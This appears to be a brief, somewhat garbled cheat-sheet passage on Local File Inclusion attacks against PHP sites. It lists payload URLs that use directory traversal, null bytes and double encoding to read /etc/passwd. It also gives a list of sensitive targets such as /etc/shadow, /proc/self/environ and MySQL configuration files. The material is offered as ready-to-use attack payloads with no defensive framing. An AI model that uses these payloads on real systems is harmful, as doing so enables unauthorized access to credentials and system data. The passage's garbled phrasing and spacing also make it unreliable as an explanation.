
Viewing files on the server is a “Local File Inclusion” or LFI exploit. This is no worse than an RFI exploit.

```
http: //localhost/index.php? page = .. / .. / .. / .. / .. / .. / etc / passwd
```

The code will probably return to / etc / passwd. Now let’s look at the RFI aspect of this exploit. Let’s get some of the codes we’ve taken before.

#### Basic LFI (null byte, double encoding and other tricks) :

```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```

Interesting files to check out :
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
```

and make sure to visit the files of the website for finding plugins/frameworks with vulnv.